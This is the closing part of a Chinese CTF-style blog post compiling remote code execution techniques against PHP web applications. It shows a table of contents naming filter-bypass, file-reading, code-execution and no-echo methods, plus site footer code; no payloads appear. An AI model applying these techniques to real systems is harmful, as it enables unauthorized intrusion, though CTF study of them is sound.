target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/220813">php利用math函数rce总结<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>与<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/106104340">[CISCN 2019 初赛]Love Math的WP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p><h2 id="disable-functions绕过"><a href="#disable-functions绕过" class="headerlink" title="disable_functions绕过"></a><strong>disable_functions</strong>绕过</h2><p>emm，另写文章有点多了</p></div><div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8"><div class="article-copyright-info-container"><ul><li><strong>标题:</strong> RCE大汇总</li><li><strong>作者:</strong> tiran</li><li><strong>创建于 :</strong> 2025-06-25 16:55:30</li><li><strong>更新于 :</strong> 2025-07-16 12:05:37</li><li><strong>链接:</strong> https://www.tiran.cc/2025/06/25/RCE大汇总/</li><li><strong>版权声明: </strong>本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。</li></ul></div></div><div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8"><div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="prev" rel="prev" href="/2025/06/25/SQL%E6%B3%A8%E5%85%A5%E6%B1%87%E6%80%BB/"><span class="left arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-left"></i> </span><span class="title flex justify-center items-center"><span class="post-nav-title-item truncate max-w-48">SQL注入汇总</span> <span class="post-nav-item">上一篇</span></span></a></div><div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="next" rel="next" href="/2025/05/30/LitCTF-2025/"><span class="title flex justify-center items-center"><span class="post-nav-title-item truncate max-w-48">LitCTF-2025</span> <span class="post-nav-item">下一篇</span> </span><span class="right arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-right"></i></span></a></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><div class="toc-title">目录</div><div class="page-title">RCE大汇总</div><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="nav-text">文件名被过滤怎么绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E6%96%87%E4%BB%B6"><span class="nav-text">*通配符文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8C%B9%E9%85%8D%E6%96%87%E4%BB%B6%E5%90%8D"><span class="nav-text">?匹配文件名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="nav-text">正则匹配</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E5%89%B2%E6%96%87%E4%BB%B6%E5%90%8D"><span class="nav-text">分割文件名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BD%AC%E8%BF%9B%E5%88%B6"><span class="nav-text">转进制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E7%AE%A1%E9%81%93%E7%AC%A6"><span class="nav-text">利用管道符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="nav-text">&#x2F;被过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="nav-text">空格过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F"><span class="nav-text">特殊变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5"><span class="nav-text">变量拼接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%84%E7%A7%8D%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-text">各种读取文件的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cat%EF%BC%8Ctac%EF%BC%8Cnl"><span class="nav-text">cat，tac，nl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#more-bzmore"><span class="nav-text">more&#x2F;bzmore</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-bzless"><span class="nav-text">less&#x2F;bzless</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#head%EF%BC%8Ctail"><span class="nav-text">head，tail</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sed"><span class="nav-text">sed</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sort"><span class="nav-text">sort</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#uniq"><span class="nav-text">uniq</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rev"><span class="nav-text">rev</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#od"><span class="nav-text">od</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vim-vi"><span class="nav-text">vim&#x2F;vi</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#man"><span class="nav-text">man</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#paste"><span class="nav-text">paste</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#grep"><span class="nav-text">grep</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#file"><span class="nav-text">file</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dd"><span class="nav-text">dd</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#date"><span class="nav-text">date</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E8%AF%BB%E5%8F%96"><span class="nav-text">报错读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#diff"><span class="nav-text">diff</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="nav-text">系统命令执行函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#system"><span class="nav-text">system()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#passthru"><span class="nav-text">passthru()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exec"><span class="nav-text">exec()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shell-exec"><span class="nav-text">shell_exec()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pcntl-exec"><span class="nav-text">pcntl_exec()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#popen"><span class="nav-text">popen()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%95%E5%8F%B7"><span class="nav-text">反引号&#96;&#96;</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="nav-text">代码执行函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eval"><span class="nav-text">eval()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#assert"><span class="nav-text">assert()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call-user-func"><span class="nav-text">call_user_func()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#create-function"><span class="nav-text">create_function()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#array-map"><span class="nav-text">array_map()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#preg-replace"><span class="nav-text">preg_replace()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E5%87%BD%E6%95%B0%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-text">php函数直接读取文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%84%E7%A7%8D%E5%87%BD%E6%95%B0"><span class="nav-text">各种函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="nav-text">原生类读文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%BB%95%E8%BF%87"><span class="nav-text">无回显绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#shell-exec%E7%AD%89%E6%97%A0%E5%9B%9E%E6%98%BE%E5%87%BD%E6%95%B0"><span class="nav-text">shell_exec等无回显函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dev-null-2-1%E7%B1%BB%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="nav-text">&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1类无回显</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-GET-%E5%B0%86%E6%81%B6%E6%84%8F%E5%91%BD%E4%BB%A4%E5%B8%A6%E5%87%BA"><span class="nav-text">使用$_GET[]将恶意命令带出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D"><span class="nav-text">无数字字母</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="nav-text">临时文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%82%E6%88%96%EF%BC%8C%E5%8F%96%E5%8F%8D%EF%BC%8C%E8%87%AA%E5%A2%9E%EF%BC%8C%E6%88%96%E7%BB%95%E8%BF%87"><span class="nav-text">异或，取反，自增，或绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%81%E9%99%90%E5%AD%97%E7%AC%A6rce"><span class="nav-text">极限字符rce</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0rce"><span class="nav-text">无参数rce</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80scandir-%E6%9C%80%E5%B8%B8%E8%A7%84%E7%9A%84%E9%80%9A%E8%A7%A3"><span class="nav-text">方法一scandir() 最常规的通解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9Asession-id"><span class="nav-text">方法二：session_id()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%9B%BF%E6%8D%A2"><span class="nav-text">缓冲区替换</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8CRCE"><span class="nav-text">利用数学函数进行RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#disable-functions%E7%BB%95%E8%BF%87"><span class="nav-text">disable_functions绕过</span></a></li></ol></div></div></div></div></div></div><div class="main-content-footer"><footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color"><div class="info-container py-3 text-center"><div class="text-center">&copy; <span>2025</span> - 2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration:0.5s;color:#f54545"></i>&nbsp;&nbsp;<a href="/">tiran</a><p class="post-count space-x-0.5"><span>共撰写了 6 篇文章</span></p></div><script data-swup-reload-script src="https://cn.vercount.one/js"></script><div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right"><span id="busuanzi_container_site_uv" class="lg:!block"><span class="text-sm">访问人数</span> <span id="busuanzi_value_site_uv"></span> </span><span id="busuanzi_container_site_pv" class="lg:!block"><span class="text-sm">总访问量</span> <span id="busuanzi_value_site_pv"></span></span></div><div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left"><span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span> <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span></div><div>博客已运行 <span class="odometer" id="runtime_days"></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒</div><script data-swup-reload-script>try{function odometer_init(){document.querySelectorAll(".odometer").forEach(e=>{new Odometer({el:e,format:"( ddd).dd",duration:200})})}odometer_init()}catch(e){}</script></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="article-tools-list"><li class="right-bottom-tools page-aside-toggle"><i class="fa-regular fa-outdent"></i></li></ul></div></div><div class="right-side-tools-container"><div class="side-tools-container"><ul class="hidden-tools-list"><li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-plus"></i></li><li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-minus"></i></li><li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center"><i class="fa-regular fa-moon"></i></li><li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center"><i class="fa-regular fa-arrow-down"></i></li></ul><ul class="visible-tools-list"><li class="right-bottom-tools toggle-tools-list flex justify-center items-center"><i class="fa-regular fa-cog fa-spin"></i></li><li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="image-viewer-container"><img src=""></div></main><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/Swup.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/SwupSlideTheme.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/SwupScriptsPlugin.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/SwupProgressPlugin.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/SwupScrollPlugin.min.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/SwupPreloadPlugin.min.js"></script><script>const swup=new Swup({plugins:[new SwupScriptsPlugin({optin:!0}),new SwupProgressPlugin,new SwupScrollPlugin({offset:80}),new SwupSlideTheme({mainElement:".main-content-body"}),new SwupPreloadPlugin],containers:["#swup"]})</script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/tools/imageViewer.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/utils.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/main.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/layouts/navbarShrink.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/tools/scrollTopBottom.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/tools/lightDarkSwitch.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/layouts/categoryList.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/tools/codeBlock.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/layouts/lazyload.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/tools/runtime.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/odometer.min.js"></script><link rel="stylesheet" href="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/assets/odometer-theme-minimal.css"><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/Typed.min.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/plugins/typed.js"></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/anime.min.js"></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/tools/tocToggle.js" data-swup-reload-script></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/layouts/toc.js" data-swup-reload-script></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/plugins/tabs.js" data-swup-reload-script></script><script src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/libs/moment-with-locales.min.js" data-swup-reload-script></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.5/source/js/build/layouts/essays.js" data-swup-reload-script></script></body></html>